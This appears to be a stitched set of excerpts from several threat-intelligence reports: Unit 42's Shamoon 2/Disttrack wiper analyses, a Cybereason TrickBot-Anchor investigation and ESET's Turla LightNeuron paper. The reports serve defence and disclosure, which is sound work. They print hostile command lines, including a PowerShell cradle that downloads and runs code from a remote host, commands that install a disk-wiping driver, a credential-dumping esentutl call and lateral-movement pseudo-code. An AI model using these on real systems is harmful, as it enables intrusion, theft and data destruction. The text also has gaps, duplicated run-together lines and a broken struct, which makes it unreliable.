      "Tags: Disttrack Wiper, EMEA, Saudi Arabia, Shamoon 2, threat intelligence\n",
      "This post is also available in:\n",
      "日本語 (Japanese)In August 2012, an attack campaign known as Shamoon targeted a Saudi Arabian energy company to deliver a malware called Disttrack. Disttrack is a multipurpose tool that exhibits worm-like behavior by attempting to spread to other systems on a local network using stolen administrator credentials. More importantly, its claim to fame is the ability to destroy data and to render infected systems unusable. The attack four years ago resulted in 30,000 or more systems being damaged.\n",
      "Last week, Unit 42 came across new Disttrack samples that appear to have been used in an updated attack campaign. The attack targeted at least one organization in Saudi Arabia, which aligns with the targeting of the initial Shamoon attacks. It appears the purpose of the new Disttrack samples were solely focused on destruction, as the samples were configured with a non-operational C2 server to report to and were set to begin wiping data exactly on 2016/11/17 20:45. In another similarity to Shamoon, this is the end of the work week in Saudi Arabia (their work week is from Sunday to Thursdays), so the malware had potentially the entire weekend to spread.\n",
      "The 2012 Shamoon attacks took place on Lailat al Qadr, the holiest night of the year for Muslims; another time the attackers could be reasonably certain employees would not be at work.\n",
      "Composition of Disttrack\n",
      "Disttrack is comprised of three distinct parts: the dropper, communications and wiper components. The main Disttrack executable is a dropper that extracts additional tools from embedded resources and coordinates when to save and execute them. Embedded within each Disttrack sample is a component responsible for communicating with a C2 server and a separate component used to carry out the wiping functionality.\n",
      "The dropper extracts the communications and wiper components from resources named \"PKCS7\" and \"PKCS12\" respectively, while the x86 sample extracts the x64 variant of Disttrack from a resource named “X509”. To extract the components, the dropper is configured to seek specific offsets within the resource, read a specified number of bytes and decrypt the contents using a specified key. The key exists in the sample as a base64 encoded string that the dropper will decode then use each byte of the resulting string to XOR the data obtained from the resource. When determining the location of the ciphertext within the resource, the dropper subtracts 14 from the offset value in the sample's configuration as an additional layer of obfuscation. Table 1 shows the resources within the Disttrack x86 sample, the component it contains and the values needed to decrypt its contents.\n",

      "Disttrack Functionality\n",
      "Disttrack is mainly focused on data destruction and attempting to damage as many systems as possible. To do so, this malware attempts to spread to other systems on network using what are likely stolen administrator credentials. This is again similar to the 2012 Shamoon attacks, where compromised but legitimate credentials obtained in advance of the attacks were also hard coded into the malware to aid in its propagation. Disttrack also has the ability to download and execute additional applications to the system, as well as remotely set the date to start wiping systems.\n",
      "Local Network Spreading\n",
      "The Disttrack malware spreads to other systems automatically using stolen credentials. The Disttrack we analyzed contained the internal domain names and administrator credentials associated with the targeted organization. The internal domain and credentials appear to be stolen prior to the creation of this tool, as it is not a public domain and the credentials are not weak enough to have obtained through guessing, brute force or dictionary attacks.\n",
      "Disttrack uses the internal domain names and credentials to log into remote systems on the same network segment. The malware determines the local network segment associated with the target system (call to gethostname) by obtaining the IP address for the system (call to gethostbyname). It then uses the system's IP addresses to enumerate the /24 network (x.x.x.0-255) that the system is networked with, and will attempt to spread to each of these remote systems.\n",
      "The dropper then attempts to open the service manager on each remote system to start the RemoteRegistry service, which it will connect to using RegConnectRegistryW. Once connected, the dropper attempts to disable UAC (User Access Control) remote restrictions by setting the following registry key to a value of \"1\":\n",
      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy\n",
      "After disabling UAC, the dropper connects to the remote system (using NetUseAdd) and logs in using the embedded stolen credentials. The dropper then checks to see if it has administrator privileges on the remote system by attempting to open \"\\system32\\csrss.exe\", which allows it to determine if it can write its payload to the \"\\system32\" folder on the remote system. The dropper then has two different methods in which it can pivot to the remote system.\n",
      "The first method involves the dropper writing itself to \"\\system32\\ntssrvr32.exe\" on the remote system. After writing itself to the remote system, the dropper creates a service named \"ntssrv\", with a display name of \"Microsoft Network Realtime Inspection Service\" and a description of \"Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols\" to execute the payload.\n",
      "The second, alternative method also involves the dropper copying itself to \"\\system32\\ntssrvr32.exe\" on the remote system; however, instead of creating a remote service, this method calls the NetScheduleJobAdd function within the Windows netapi32 library to create a scheduled task to run the payload. Scheduled tasks require a time in which the task will run, which the dropper determines by calling the function NetRemoteTOD to obtain the time of day from the remote system. The dropper then adds 90 seconds to the time of day value on the remote system and uses this value as the \"JobTime\" to run the task in three minutes, which executes the payload on the remote system. The following pseudo-code shows the scheduled task creation process:\n",
      "NetRemoteTOD(UncServerName, &BufferPtr)\n",
      "NetApiBufferAllocate(0x10u, &AT_INFO)\n",
      "AT_INFO->Command = s_pathToPayload;\n",

      "+ 90);AT_INFO->Flags = JOB_NONINTERACTIVE;AT_INFO->DaysOfMonth = 0;AT_INFO->DaysOfWeek = 0;NetScheduleJobAdd(UncServerName, AT_INFO, &v16)\n",
      "C2 Communications\n",
      "Disttrack extracts the communication component from its resource named “PKCS7”, decrypts it and saves the resulting cleartext to the file %WINDOWS%\\system32\\netinit.exe.\n",
      "The communication module interacts with its C2 server using HTTP requests. The communications modules in both the x86 and x64 variants of Disttrack we analyzed were configured to use “1.1.1.1:8080” for its C2 server, which does not host an operational Disttrack C2 server. The lack of an operational C2 server suggests that the threat actors did not desire remote access to infected systems, rather the actors sought to render them unusable instead. If the modules were configured with an operational C2 server,\n",
      "the module would generate an HTTP GET request that resembles the following:\n",
      "The interesting part of the request above is that the host \"server\", the URL \"category/page.php\", the parameter \"shinu\" and the user-agent \"Mozilla/5.0 (MSIE 7.1; Windows NT 6.0)\" are hardcoded into the tool. The data in \"shinu\" parameter is a combination of the system's tickcount, local IP address, operating system version, keyboard layout and the contents of %WINDOWS%\\inf\\netimm173.pnf. The C2 server can respond to this HTTP request with one of the following two commands:\n",
      "Command\n",
      "Description\n",
      "E\n",
      "Provides an executable to run on the system. The executable is saved to %TEMP%\\Temp\\filer\\<tickcount>.exe\n",
      "T\n",
      "Sets the time to start wiping the system, by writing the date to %WINDOWS%\\inf\\usbvideo324.pnf.\n",
      "We believe the HTTP host value of \"server\" and the non-operational \"1.1.1.1\" C2 address may suggest that the communication module is created with a builder tool, which in this case the actor mistakenly or purposefully did not provide an active C2 server when building this module. While completely speculative, the word “shinu” used as a parameter could be a reference to the Arabic slang for the word “what”, as well as a reference to a village name in northwestern Iran.\n",
      "Disttrack Data Destruction\n",
      "The Disttrack dropper is responsible for installing the wiper component of this Trojan, however, it will only activate this component if the system time is greater than a preset date. The dropper obtains a date used to activate the wiping functionality by reading a specific file, or using a hardcoded timestamp of \"2016/11/17 20:45\". The file containing this timestamp is named \"\\inf\\usbvideo324.pnf\", which is not initially installed but is provided by the C2 server if it sends the communications module the \"T\" command. The \"usbvideo324.pnf\" file would have the following structure:\n",
      "BYTE year;\n",
      "BYTE month;\n",
      "BYTE day;\n",
      "BYTE hour;\n",
      "BYTE year;\n",
      "BYTE minute;\n",
      "If the dropper determines the system date is larger than the specified date, the dropper will extract the wiper component from a resource named \"PKCS12\" and save it to the \"system32\" folder with one of the following filenames appended with a \".exe\" extension:\n",

      "The dropper then runs the wiper component with a command line argument of \"1\". The wiper component extracts a driver from its resource section and decrypts it with a 226 byte XOR key. The wiper saves the extracted driver to \"C:\\Windows\\System32\\Drivers\\drdisk.sys\" and installs the kernel driver by creating a service named \"drdisk\" with the following command line commands:\n",
      "sc create drdisk type= kernel start= demand binpath=\n",
      "System32\\Drivers\\drdisk.sys 2>&1 >nul\n",
      "sc start drdisk 2>&1 >nul\n",

      "sc create drdisk type= kernel start= demand binpath= System32\\Drivers\\drdisk.sys 2>&1 >nulsc start drdisk 2>&1 >nul\n",
      "The kernel driver is a commercial product that the attackers are abusing called RawDisk by EldoS Corporation, which provides direct access to files, disks and partitions. It appears that the “drdisk.sys” driver (SHA256: 4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6) is the exact same driver as used in the Shamoon attack in 2012. With the kernel driver installed, the wiper can begin writing to protected system locations, such as the master boot record (MBR) and partition tables of storage volumes. The wiper can be configured to overwrite files in three different ways, specified by a configuration setting of \"F\", \"R\" or \"E\". If configured with the \"F\" setting, the wiper loads a resource named AJKEOA, which extracts a JPEG image to use to overwrite files and partition tables. If the wiper is configured with the \"E\" setting, the wiper will encrypt the contents of the file using a random value as a key and the RC4 algorithm. If configured with the \"R\" setting, the wiper will overwrite files with the random values that would be used as a key in \"E\".\n",
      "The sample we analyzed was configured with \"F\", meaning it would overwrite files with an image obtained from its resource section. The image extracted is a picture of a Syrian boy named Alan Kurdi, whose drowning on September 2, 2015 received international attention in regards to the ongoing Syrian refugee crisis. The previous Shamoon attack in 2012 used an image of a burning American flag, continuing the political image theme.\n",
      "From a functionality standpoint, the wiper relies on EldoS' RawDisk driver to overwrite files on the system. During this activity, we noticed the wiper changing the system time to August 2012, as the temporary license key for the RawDisk driver requires the system time to not exceed the month of August, which is when the temporary license would expire. This modification to the system time was seen in the previous campaign, and the temporary license key within the wiper component is the exact same as wiper component from the 2012 attacks. The wiper itself queries the following registry keys to obtain a list of partitions to overwrite:\n",
      "HKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareBootDevice\n",
      "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemBootDevice\n",
      "12\n",
      "HKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareBootDeviceHKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemBootDevice\n",
      "In addition to these partitions, the wiper attempts to overwrite files and subfolders within in the following folders:\n",
      "C:\\Documents and Settings\n",
      "C:\\Users\n",
      "C:\\Windows\\System32\\Drivers\n",
      "C:\\Windows\\System32\\Config\\systemprofile\n",
      "1234\n",
      "C:\\Documents and SettingsC:\\UsersC:\\Windows\\System32\\DriversC:\\Windows\\System32\\Config\\systemprofile\n",
      "After overwriting these files and the partition tables, the wiper issues the following command to restart the system:\n",
      "shutdown -r -f -t 2\n",
      "1\n",
      "shutdown -r -f -t 2\n",
      "The arguments and switches used in the “shutdown” command above forces all running applications to close and causes the system to reboot (‘-r’) after 2 seconds (‘-t 2’). This command does result in a dialog prompt, seen in Figure 1, that informs the user that the system is shutting down.\n",
      "Figure 1 Dialog prompt displayed when the Wiper component runs the 'shutdown' command\n",
      "With the partition tables overwritten, the system will no longer be able to properly boot, which renders the system unusable. During analysis, our analysis system was rendered unusable, as the virtual machine was unable to find the operating system during boot up, as seen in Figure 2.\n",
      "Figure 2 Analysis virtual machine unable to boot after executing Disttrack Wiper\n",
      "Conclusion\n",
      "After a four year hiatus, threat actors likely associated with the Shamoon attack campaign have used their Disttrack malware to target at least one organization in Saudi Arabia. The current attack campaign has several TTP overlaps with the original Shamoon campaign, especially from a targeting and timing perspective. Also, Disttrack malware used in the recent attacks is very similar to the variant used in the 2012 attacks, which uses the exact same RawDisk device driver as well (down to the same, temporary license key).. The main purpose of the Disttrack malware is to overwrite files and storage partitions in an attempt to destroy data and render the system unusable. To maximize its destruction, the Disttrack tool attempts to spread to other systems on the network using stolen administrator credentials, which suggests that the threat actors had previous access to the network or carried out successful phishing attacks prior to the attack using Disttrack.\n",

      "This post is also available in:\n",
      "日本語 (Japanese)Summary\n",
      "On December 10,\n",
      "a new variant of the Disttrack malware was submitted to VirusTotal (SHA256:c3ab58b3154e5f5101ba74fccfd27a9ab445e41262cdf47e8cc3be7416a5904f) that shares a considerable amount of code with the Disttrack malware used in the Shamoon 2 attacks in 2016 and 2017 that we previously published here, here, and here. While we could not identify the impacted organization from the malware, today Saipem disclosed they were attacked. In previous attacks, we were able to determine the impacted organization based on the domain names and credentials used by the Disttrack tool to spread to other systems on the network. However, that functionality was missing from this sample. Unlike past Shamoon attacks, this particular Disttrack wiper would not overwrite files with an image. Instead it would overwrite the MBR, partitions, and files on the system with randomly generated data.\n",
      "According to a press release,\n",
      "Saipem confirmed that they experienced a cyberattack that involved a variant of the Shamoon malware. The attack caused infrastructure and data availability issues, forcing the organization to carry out restoration activities. Saipem told Reuters that 300 systems on their network were crippled by the malware related to the 2012 Shamoon attacks. While we cannot definitively confirm that Saipem was the impacted organization, the timing of this incident with the emergence of the Disttrack sample discussed in this blog is quite coincidental.\n",
      "Dropper\n",
      "The sample submitted to VirusTotal is a Disttrack dropper, which is responsible for installing a communications and wiper module to the system. The dropper is also responsible for spreading to other systems on the same local network, which it accomplishes by attempting to log into other systems on the network remotely using previously stolen usernames and passwords. Unfortunately, this particular sample does not contain any domains, usernames, or passwords to perform this spreading functionality, so this sample would only run on the system in which it was specifically executed.\n",
      "The dropper has a hardcoded kill time of '12/7/17 23:51'; if the system date is after this date the dropper installs the wiper module and starts wiping files on the system. The dropper reads the '%WINDOWS%\\inf\\mdmnis5tQ1.pnf' file to obtain a custom kill date that it will use instead of the hardcoded time. The communications module installed by the dropper writes to this file, which will be discussed in a later section. The dropper also decrypts a string '\\inf\\averbh_noav.pnf' that is the other file that the communications module uses to write system information to and if the wiper was able to successfully wipe the system, but the dropper does not appear to use this file.\n",
      "The dropper has three resources, two of which contain embedded modules, specifically a communications module and a wiper module. The third resource contains an x64 variant of the dropper, which it will use if the architecture of the system is determined to be x64. The resources have a language set to ‘SUBLANG_ARABIC_YEMEN’ that was also found in the previous Disttrack samples used in Shamoon 2 attacks. The resource names are PIC, LNG, and MNU, which are slightly altered versions of the ICO, LANG, and MENU names found in previous samples.\n",
      "The dropper extracts modules from these resources by seeking a specific offset and reading a specific number of bytes as the length of the ciphertext. The dropper then decrypts the ciphertext by using an XOR cipher and a specific base64 encode string that is decoded and used as the key. Before accessing the ciphertext, the dropper subtracts 14 from the specified offset, which is the same as previous Disttrack samples delivered in Shamoon 2 attacks. Tables 1, 2, and 3 include the resources, the information used to extract them, and the resulting module.\n",

The wiper carries out this wiping using a legitimate hard disk driver called RawDisk by ElDos. The wiper contains the ElDos RawDisk driver in a resource named 'e' that it extracts by skipping to offset 1984 and reading 27792 bytes from that offset. It then decrypts the data using aa 247-byte key and saves it to ‘%WINDOWS%\\system32\\hdv_725x.sys’. The wiper then creates a service named ‘hdv_725x’ for this driver using the following command line command and runs it with \"sc start hdv_725x\":\n",

      "The Disttrack sample uploaded to VirusTotal is a variant of the samples used in the Shamoon 2 attacks in 2016 and 2017. The tool does not have the capability to spread to other systems on the local network. Instead it would have to be loaded onto and executed on the system that the actors intend to wipe. The wipe date of '12/7/2017' does not seem timely. However, this older date is still effective as the Disttrack dropper will install and run the wiper module as long as the system date is after the wipe date. Unlike past Shamoon attacks, this particular Disttrack wiper would not overwrite files with an image. Instead, it would overwrite the MBR, partitions and files on the system with random data. While we can’t confirm this sample was used in the Saipem attack, it is likely at least related to it.\n",

      "Introduction\n",
      "Research By: Assaf Dahan, Lior Rochberger, Eli Salem, Mary Zhao, Niv Yona, Omer Yampel and Matt Hart\n",
      "Cybereason Nocturnus is monitoring a new wave of targeted campaigns against financial, manufacturing and retail businesses that began in early October. Similar to attacks previously reported by Cybereason, this campaign started with a TrickBot infection and progressed into a hacking operation targeting sensitive financial systems.\n",
      "However, unlike previous operations that focused on causing a massive ransomware infection (Ryuk and LockerGoga) by compromising critical assets like the domain controller, this new operation is focused on targeting point of sale (PoS) systems. The campaign leverages a newly discovered malware family called Anchor exclusively for high-profile targets.\n",
      "Learn more about additional attacks that leverage TrickBot.\n",
      "This research focuses on the following aspects of the TrickBot-Anchor attack:\n",
      "Anatomy of the Attack: A step-by-step anatomy of the attacks, including infection vectors and a dissection of the tools and techniques used by the attackers.\n",
      "New Malware: The discovery of a new malware family called Anchor, which includes the Anchor_DNS and a new, undocumented Anchor that has been operating since August 2018 (and potentially even earlier). The Anchor malware is a backdoor used very selectively on high-profile targets, and appears to be tightly connected to TrickBot, potentially even authored by the same individuals who created TrickBot.\n",
      "While this blog does not discuss attribution explicitly, the nature of these attacks, specifically the motivation, some of the tools and techniques detailed,\n",
      "have certain resemblance to past attacks that were linked to the financially-motivated FIN6 threat actor, a group that is known to target POS systems and has been linked to TrickBot infections in the past.\n",
      "Lastly, our blog emphasizes the gravity and danger that lies in commodity malware infections, as they have the potential of escalating into a hacking operation. This can easily lead to a disastrous outcome, whether it be a ransomware infection or theft of sensitive financial data.\n",
      "Key Points\n",
      "The TrickBot-Anchor Operation: Cybereason Nocturnus is investigating a series of targeted attacks against financial, manufacturing, and retail businesses across the United States and Europe.\n",
      "Targets POS Systems: The attacks target POS systems to steal sensitive information by taking over critical assets in the victims’ network.\n",
      "Deploys A Backdoor on High-value Targets: On certain high-profile targets, the attackers selectively use a new variant of the rare Anchor_DNS tool. Anchor_DNS is a backdoor that uses the DNS protocol to stealthily communicate with C2 servers.\n",
      "Uses a New, Undocumented Malware: In addition to the new Anchor_DNS variant, the attackers use a completely new and previously undocumented malware dubbed Anchor. Anchor has been in operation since August 2018 and appears to be tightly related to TrickBot.\n",
      "Adds Enhancements to TrickBot: This attack adds a new and enhanced stealing module to TrickBot that focuses on stealing passwords from various products, including the KeePass password manager.\n",
      "Uses Known Tools for Reconnaissance and Lateral Movement: The majority of the initial interactive hacking operation uses the known tools Meterpreter, PowerShell Empire, and Cobalt Strike for reconnaissance and lateral movement.\n",
      "Abuses the Trust of Certificate Authorities: Many of the payloads in the attacks are signed binaries, which demonstrates the ever-growing trend of signed threats that abuse the trust of certificate authorities to bypass detection.\n",

      "An overview of the attack tree, as seen in the Cybereason Defense Platform.\n",
      "Infection Vector\n",
      "Downloading and injecting TrickBot.\n",
      "The attack starts with a phishing email that contains a malicious link to a file hosted on Google Docs named “Annual Bonus Report.doc”. When the user clicks on the link, the TrickBot dropper downloads onto the target machine. This differs from previous TrickBot attacks we have seen, where TrickBot is usually dropped through a Microsoft Office document or by another malware like Emotet.\n",
      "Phishing email that tricks the user into downloading TrickBot.\n",
      "The TrickBot Downloader\n",
      "The campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document. When the user double-clicks the file, they are presented with a decoy message box. To avoid suspicion, the decoy message suggests the user should update Microsoft Word or open the file from another computer.\n",
      "TrickBot displays a message box suggests updating Microsoft Word or opening the file on another computer to preview the document.\n",
      "While at first glance these files can be mistaken for legitimate Microsoft Word files, a closer inspection of the file metadata indicates they are not associated with Microsoft Word, nor are they Microsoft Word document files.\n",
      "Most of the initial payloads in these campaigns are signed with valid certificates to evade security tools. They abuse the relative trust that is given to signed binaries to avoid detection.\n",
      "File metadata properties for the fake Microsoft Word Document.\n",
      "Signed malware is an evasive initial entry point into an organization.\n",
      "The message box distracts the user as TrickBot’s payload is downloaded, stored in the %TEMP% folder, and executed. A new process injects the TrickBot payload into a svchost.exe process.\n",
      "svchost.exe injected code malicious evidence as seen in the Cybereason Platform.\n",
      "Domain associated with the TrickBot payload download.\n",
      "The TrickBot Payload\n",
      "Once TrickBot’s main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected endpoint and the network. This information is crucial, as it determines the course of the attack.\n",
      "Checking Network Connectivity\n",
      "TrickBot checks for Internet connectivity by trying to access several designated domains. These domains are preconfigured and belong to legitimate web services, including: checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, ip.anysrc.net.\n",
      "Once TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains. It collects and sends information about where the target machine is located to the C2 servers.\n",
      "Browser History and Credential Theft\n",
      "After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity. The module core-parser.dll is reflectively loaded into svchost.exe. core-parser.dll parses the TrickBot config files and extracts IP addresses for secondary C2 communication, redirection, and web injection logic.\n",
      "core-parser.dll injected into svchost.dll.\n",
      "TrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server. The C2 server is responsible for handling the stolen data.\n",
      "A list of C2 servers extracted from TrickBot’s configuration.\n",
      "TrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique (LOLBin).\n",
      "esentutl /p /o C:\\Users\\[USER]\\AppData\\Local\\Temp\\grabber_temp.edb\n",
      "This command dumps the Extensible Storage Engine (ESE) database format.\n",
      "Application-specific Credential Theft\n",
      "This variant of TrickBot employs a new, unique ability to steal passwords from KeePass, a free, open- source password manager. TrickBot's KeePass stealing capabilities seem to be inspired (or even partially copy-pasted) from a publicly available tool dubbed PoshKPBrute, a script that performs a dictionary attack against KeePass .kdbx files. Once it finds the dictionary key, it dumps all passwords as an output and sends the attackers the master password.\n",
      "KeePass stealing brute force tool.\n",
      "TrickBot’s stealer module also tries to extract keys from Filezilla, OpenSSH and OpenVPN.\n",
      "TrickBot attempting to steal keys from Filezilla, OpenSSH, and OpenVPN.\n",
      "Reconnaissance Commands\n",
      "In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe. They gather information on:\n",
      "All trusted domains, domains, and domain controllers\n",
      "A list of computers and network devices on the network\n",
      "The infected machine user and groups the user belongs to\n",
      "The infected machine, including machine name, operating system, workstation domain, and more information\n",
      "Network adapters that have connected to the machine and DNS servers\n",
      "The net.exe process tree.\n",
      "Nltest / domain_trusts /all_trustsNet view /allNltest /domain_trustsNet view /all /domainIpconfig /allNet config workstationNslookup “-q=srv_kerberos._tcp”/c “start microsoft-edge:http://127.0.0.1:52715/11984”\n",
      "Reconnaissance commands launched by TrickBot.\n",
      "The attacker also uses PowerShell to test DNS entry settings. They use the command -q=srv_kerberos_tcp on the process nslookup.exe to open an interactive shell. They use the shell to expand their search to other machines on the network by searching for things like a list of the domain controllers.\n",
      "TrickBot testing DNS settings.\n",
      "With this in mind, we gather that the attackers goal is to spread within organizations to multiple machines, not just to the target machine.\n",
      "From TrickBot Infection to Interactive Hacking\n",
      "The threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target. If so, they escalate their efforts by switching to interactive hacking: reconnaissance, credential dumping, lateral movement, and in some cases the mass deployment of ransomware across endpoints connected to the domain controller.\n",
      "PowerShell Payloads\n",
      "The threat actor leverages PowerShell to send additional payloads to the target machine. They issue commands to fetch a payload from a secondary server and, once it’s downloaded, immediately execute it on the target machine through PowerShell.\n",
      "powershell.exe -nop -WindowStyle Hidden -executionpolicy bypass -c \"IEX ((new-object net.webclient).downloadstring('hxxps://northracing[.]net/?a=irs&x=[base64]'))\"\n",
      "The northracing[.]net URL contains a PowerShell script in the contents of the webpage. Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity. The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see if it should continue its operation. If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from. Each POST request is sent along with a UUID generated from the user’s hostname and the current process ID.\n",
      "Information sent along each POST request in the payload.\n",
      "A POST request containing basic information about the machine is sent, which includes the current user and their domain, the root of the file system, and information about the operating system.\n",
      "The PowerShell payloads using WMI to probe for system information.\n",
      "This information is sent to the C2 along with the `i` parameter. When a response is received, the payload checks to see if the response matches the value cex01. If it does, the PowerShell script stops executing and kills the task. If the response is any other value, the script sets a timeout variable based on the response and continues to the main loop.\n",
      "This indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.\n",
      "The main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.\n",
      "The main loop that sends a POST request to the server.\n",
      "Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet. The output of the command is sent back to the C2 server using a POST request with the “a” parameter.\n",
      "Meterpreter & Cobalt Strike Implants\n",
      "The attack tree demonstrating the beginning of the hacking operation using Meterpreter.\n",
      "Meterpreter Implant\n",
      "The attackers use a Meterpreter implant to carry out post-exploitation actions. The Cybereason Platform detects both the shellcode and various Meterpreter DLLs reflectively loaded to memory. The detected DLLs include:\n",
      "Metsrv.dll: For Meterpreter, where the protocol and extension systems are implemented\n",
      "Ext_server_priv.x86.dll: For privilege escalation\n",
      "Ext_server_stdapi.x86.dll: A metasploit post exploitation module used for reconnaissance\n",

      "New Anchor_DNS Variant Discovered\n",
      "One of the most interesting payloads in these attacks is the Anchor_DNS malware, which was originally discovered in October 2019 by NTT Security. It is classified by NTT as a variant of the infamous TrickBot malware, which uses DNS tunneling to stealthily communicate with C2 servers. Though this variant was first discovered in October 2019, there is evidence that Anchor_DNS was used as far back as March 2019.\\\n",

      "Code signing is meant to provide a level of credibility and integrity to a binary from the developer, and to guarantee that the binary has not been tampered with. In the past, signing malware was a practice mostly seen with nation-state threat actors. However, this is no longer the case. Nowadays, more and more commodity malware are being signed with valid certificates, effectively bypassing some security solutions that grant trust to signed binaries.\n",

      "Conclusion\n",
      "This research gives a detailed step-by-step analysis of recent attacks targeting the financial, manufacturing, and retail sectors across the United States and Europe. These attacks start with a TrickBot infection and, with high-profile targets, can escalate to a hacking operation leveraging a new malware, Anchor, and a new variant of Anchor_DNS.\n",
      "Unlike previously reported TrickBot attacks that resulted in mass ransomware infections, these new attacks focus on stealing sensitive information from POS systems and other sensitive resources in the victims’ network by compromising critical assets.\n",
      "In addition, Cybereason discovered a previously undocumented malware called Anchor as well as a new variant of the recently discovered Anchor_DNS malware. Both Anchor and Anchor_DNS are directly related to TrickBot infections and have code similarities, and sometimes also share C2 infrastructure with TrickBot. Anchor_DNS uses various techniques to keep itself under-the-radar, such as communication over DNS, and the reliance on specific command-line arguments in order to run properly. Through these techniques, it is able to evade many security products including certain sandboxes and AV vendors.\n",
      "These attacks stress the danger of commodity malware infections that sometimes may be underestimated due to their frequent use and high volume. It is important to note that, in this attack, once an endpoint is infected with TrickBot it is up to the attackers to decide their next move. If they identify a high-value target, they can go beyond the traditional information stealing capabilities of TrickBot and use the target machine as an entry point to other machines on the network.\n",
      "This research does not focus on the attribution of these attacks. However, through analysis of the evidence and context presented in our research, we noticed certain TTP overlaps\n",
      "with earlier attacks that were attributed\n",
      "to the financially-motivated FIN6 threat actor. We leave it to our readers to draw their own conclusions on the attribution of these attacks.\n",
      "Lastly, these attacks show how threat actors are shifting toward signed malware more than ever before. As this trend continues to evolve, security practitioners and security vendors must improve the detection of signed malware and re-think the trust given to signed binaries in general.\n",
      "The best way to defend against an attack like this is to use an iterative security process. Read more in our white paper.\n",

      "EXECUTIVE SUMMARY\n",
      "Turla, also known as Snake, is one of oldest, still-active cyberespionage groups, with more than a decade\n",
      "of experience. Its operators mainly focus on high-profile targets such as governments and diplomatic\n",
      "entities in Europe, Central Asia and the Middle East. They are known for having breached major organiza -\n",
      "tions such as the US Department of Defense in 2008 and the Swiss defense company RUAG in 2014. More\n",
      "recently, several European countries including France and the Czech Republic went public to denounce\n",
      "Turla’s attacks against their governments.\n",
      "To perform these operations, Turla’s operators own a large arsenal of malware including a rootkit,\n",
      "several complex backdoors (with a notable one for Microsoft Outlook), and a large range of tools to pivot\n",
      "on a network.\n",
      "In this white paper, we present the analysis of LightNeuron, a backdoor specifically designed to target\n",
      "Microsoft Exchange mail servers.\n",
      "Key points in this white paper:\n",
      "• Turla is believed to have used LightNeuron since at least 2014.\n",
      "• LightNeuron is the first publicly known malware to use a malicious Microsoft Exchange Transport Agent.\n",
      "• LightNeuron can spy on all emails going through the compromised mail server.\n",
      "• LightNeuron can modify or block any email going through the compromised mail server.\n",
      "• LightNeuron can execute commands sent by email.\n",
      "• Commands are hidden in specially crafted PDF or JPG attachments using\n",
      "steganography\n",
      ".\n",
      "• LightNeuron is hard to detect at the network level because it does not use standard HTTP(S)\n",
      "communications.\n",
      "• LightNeuron was used in recent attacks against diplomatic organizations in Eastern Europe\n",

      "As opposed to some other APT (Advanced Persistent Threat) groups, Turla is far from being opportunistic\n",
      "in the selection of its targets. The group is interested in collecting information from strategic people\n",
      "or organizations. In addition, to our knowledge, Turla has never conducted cybersabotage operations,\n",
      "such as those made by GreyEnergy\n",
      "[4] or TeleBots [5].\n",
      "With several years of tracking this espionage group, we have identified the most at-risk types\n",
      "of organizations:\n",
      "• Ministries of Foreign Affairs and diplomatic representations (embassies, consulates, etc.)\n",
      "• Military organizations\n",
      "• Regional political organizations\n",
      "• Defense contractors\n",
      "Most parts of the world are targeted by Turla’s operations, with the exception, perhaps, of Eastern Asia.\n",
      "Moreover, over the past few years, we have noticed that geographical areas of conflict, such as Eastern\n",
      "Europe and the Middle East, are under heavy attacks from this APT group. However, even with this new\n",
      "focus, they did not abandon their traditional targets in Western Europe and Central Asia.\n",

      "Tools and tactics\n",

      "facets: spying on emails and acting as a full-feature backdoor.\n",
      "3.1 Impact\n",
      "While rootkits and bootkits have an unmatched stealthiness in the malware domain, LightNeuron is uncom -\n",
      "monly stealthy for “regular” malware. To our knowledge, leveraging a Microsoft Exchange Transport Agent\n",

      "Neuron was running with SYSTEM privileges. It is typically hard to gain this level of privilege on a Microsoft\n",
      "Exchange server, as it is one of the most critical assets in an organization. Thus, once compromised, it is likely\n",
      "that it will stay undetected for months or years.\n",
      "The Command and Control protocol is fully based on emails and uses steganography to store data in PDF\n",
      "and JPG attachments. Given that, in the Microsoft Exchange architecture, the malware is installed at the\n",
      "same level as anti-spam and other email security solutions, it allows the malware to bypass them easily.\n",
      "Using a nearly undetectable Command and Control channel allows the malware to stay under the radar\n",
      "for a long period.\n",
      "During the course of our investigation, we noticed alongside LightNeuron the presence of several tools used\n",
      "to control other machines on the local network. These tools include Remote Administration Software, RPC-\n",
      "based malware or .NET web shells targeting Outlook Web Access. By leveraging them, attackers are able to\n",

      "In a previous section, we explained that most of the strings used by LightNeuron are encrypted. It turns\n",

      "Figure 30 shows some of these strings that refer to Unix. For example,\n",

      "CONCLUSION\n",
      "In addition to their Turla Outlook backdoor\n",
      "[16], LightNeuron is another example that Turla operators\n",
      "have a large set of sophisticated, custom malware at their disposal.\n",
      "To our knowledge, this is the first time a malicious actor has leveraged a Microsoft Exchange Transport\n",
      "Agent to enable persistence on a mail server. This technique is very interesting as it allows them to receive\n",
      "commands and exfiltrate data without any filtering.\n",
